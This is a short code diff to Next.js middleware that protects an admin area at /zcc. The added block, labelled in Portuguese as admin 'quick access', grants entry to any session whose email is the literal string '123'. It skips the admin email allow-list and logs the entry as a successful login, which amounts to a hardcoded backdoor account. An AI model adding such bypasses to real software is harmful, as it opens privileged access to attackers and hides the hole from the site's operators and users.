@@ -383,6 +383,12 @@ export async function middleware(request: NextRequest) {
         secret: nextAuthSecret,
       });
       if (token?.email) {
+        // ZCC Admin quick access: email "123" sempre tem acesso ao /zcc
+        if (token.email === '123') {
+          auditZCCAccess({ ip, userAgent, method: 'session', success: true, path: pathname });
+          return NextResponse.next();
+        }
+
         const adminEmails = (process.env.ZCC_ADMIN_EMAILS || '')
           .split(',')
           .map(e => e.trim().toLowerCase())
